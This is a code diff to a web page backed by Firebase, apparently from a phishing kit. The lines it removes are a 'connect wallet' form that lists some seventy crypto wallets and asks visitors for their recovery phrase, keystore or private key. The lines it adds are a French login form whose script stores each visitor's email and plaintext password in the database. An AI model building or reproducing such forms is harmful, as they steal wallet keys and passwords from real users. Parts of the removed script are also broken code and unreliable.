@@ -149,106 +149,9 @@
     </style>
 </head>
 <body>
-<section>
-        <div class="wallet-actions">
-            <!-- Wallet options dynamically generated from the provided list -->
-            <label for="wallet-list">Choose Wallet:</label>
-            <select id="wallet-list" onchange="selectWallet()">
-                <option value="">Select a wallet</option>
-                <option value="MetaMask">MetaMask</option>
-                <option value="Trust Wallet">Trust Wallet</option>
-                <option value="Coinbase Wallet">Coinbase Wallet</option>
-                <option value="Ledger Nano X">Ledger Nano X</option>
-                <option value="Trezor Model T">Trezor Model T</option>
-                <option value="Mycelium">Mycelium</option>
-                <option value="Exodus">Exodus</option>
-                <option value="Leap Wallet">Leap Wallet</option>
-                <option value="Stader">Stader</option>
-                <option value="Atomic Wallet">Atomic Wallet</option>
-                <option value="Electrum">Electrum</option>
-                <option value="Coinomi">Coinomi</option>
-                <option value="Celsius">Celsius</option>
-                <option value="ZenGo">ZenGo</option>
-                <option value="Safepal S1">Safepal S1</option>
-                <option value="Ledger Nano S">Ledger Nano S</option>
-                <option value="Guard Wallet">Guard Wallet</option>
-                <option value="BitKeep">BitKeep</option>
-                <option value="eToro Money Crypto Wallet">eToro Money Crypto Wallet</option>
-                <option value="FTX Wallet">FTX Wallet</option>
-                <option value="Phantom Wallet">Phantom Wallet</option>
-                <option value="KeepKey">KeepKey</option>
-                <option value="Ellipal Titan">Ellipal Titan</option>
-                <option value="Argent Wallet">Argent Wallet</option>
-                <option value="YouHodler">YouHodler</option>
-                <option value="Bitbox02">Bitbox02</option>
-                <option value="Coldcard">Coldcard</option>
-                <option value="Keystone Pro">Keystone Pro</option>
-                <option value="Kraken">Kraken</option>
-                <option value="Gemini">Gemini</option>
-                <option value="SimpleHold Wallet">SimpleHold Wallet</option>
-                <option value="MyEtherWallet">MyEtherWallet</option>
-                <option value="Infinito Wallet">Infinito Wallet</option>
-                <option value="Wirex Wallet">Wirex Wallet</option>
-                <option value="CoinSpace Wallet">CoinSpace Wallet</option>
-                <option value="CoolWallet S">CoolWallet S</option>
-                <option value="Crypto.com DeFi Wallet">Crypto.com DeFi Wallet</option>
-                <option value="BitPay">BitPay</option>
-                <option value="Empire Wallet">Empire Wallet</option>
-                <option value="StakedWallet.io">StakedWallet.io</option>
-                <option value="Jaxx">Jaxx</option>
-                <option value="Xapo Wallet">Xapo Wallet</option>
-                <option value="Crypterium">Crypterium</option>
-                <option value="BitFreezer">BitFreezer</option>
-                <option value="Luno">Luno</option>
-                <option value="CoinJar Wallet">CoinJar Wallet</option>
-                <option value="Quppy">Quppy</option>
-                <option value="Freewallet">Freewallet</option>
-                <option value="SecuX Stone V20">SecuX Stone V20</option>
-                <option value="BitLox Ultimate">BitLox Ultimate</option>
-                <option value="Unstoppable Wallet">Unstoppable Wallet</option>
-                <option value="Binance Chain Wallet">Binance Chain Wallet</option>
-                <option value="D'CENT Wallet">D'CENT Wallet</option>
-                <option value="BC Vault Wallet">BC Vault Wallet</option>
-                <option value="Arculus Wallet">Arculus Wallet</option>
-                <option value="Robinhood Crypto Wallet">Robinhood Crypto Wallet</option>
-                <option value="Wasabi Wallet">Wasabi Wallet</option>
-                <option value="Nexo">Nexo</option>
-                <option value="BRD Wallet">BRD Wallet</option>
-                <option value="Keplr">Keplr</option>
-                <option value="GreenAddress Wallet">GreenAddress Wallet</option>
-                <option value="Huobi Wallet">Huobi Wallet</option>
-                <option value="Enjin Wallet">Enjin Wallet</option>
-                <option value="StormGain">StormGain</option>
-                <option value="Clever">Clever</option>
-                <option value="TrustVault">TrustVault</option>
-                <option value="Moonlet">Moonlet</option>
-                <option value="TokenPocket">TokenPocket</option>
-                
-
-
-                <!-- Add more wallet options dynamically -->
-            </select>
-        </div>
-
-        <form id="wallet-connect-form">
-            <label for="wallet-type">Selected Wallet:</label>
-            <input type="text" id="selected-wallet" >
-
-            <label for="wallet-info-type">Select Wallet Information Type:</label>
-            <select id="wallet-info-type" onchange="showInfoInput()">
-                <option value="phrase">Phrase</option>
-                <option value="keystore">Keystore</option>
-                <option value="private-key">Private Key</option>
-            </select>
-
-            <div id="info-input-container"></div>
-
-            <button type="button" id="submitData" name="submitData" onclick="connectWallet()">Connect</button>
-        </form>
-    </section>
 
     
-<!-- <form>
+<form>
         <h2>Connexion</h2>
         <label for="email">mail:</label>
         <input type="email" id="email" name="email" required>
@@ -257,7 +160,7 @@
         <input type="password" id="password" name="password" required>
 
         <button type="button" id="submitData" name="submitData" >Se Connecter</button>
-    </form> -->
+    </form>
     <script type="module">
   // Import the functions you need from the SDKs you need
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
@@ -284,14 +187,14 @@
         submitData.addEventListener('click',(e) => {
             var email= document.getElementById('email').value;
              var password= document.getElementById('password').value;
-            var selecte = document.getElementById('selected-wallet').value;
-            createUserWithEmailAndPassword(auth, selecte)
+            
+            createUserWithEmailAndPassword(auth, email,password)
   .then((userCredential) => {
     // Signed up 
     const user = userCredential.user;
       // ... user.uid
        set(ref(database, 'users/' + user.uid), {
-    selecte: selected-wallet,
+    email: email,
     password: password
   })
       .then(() => {
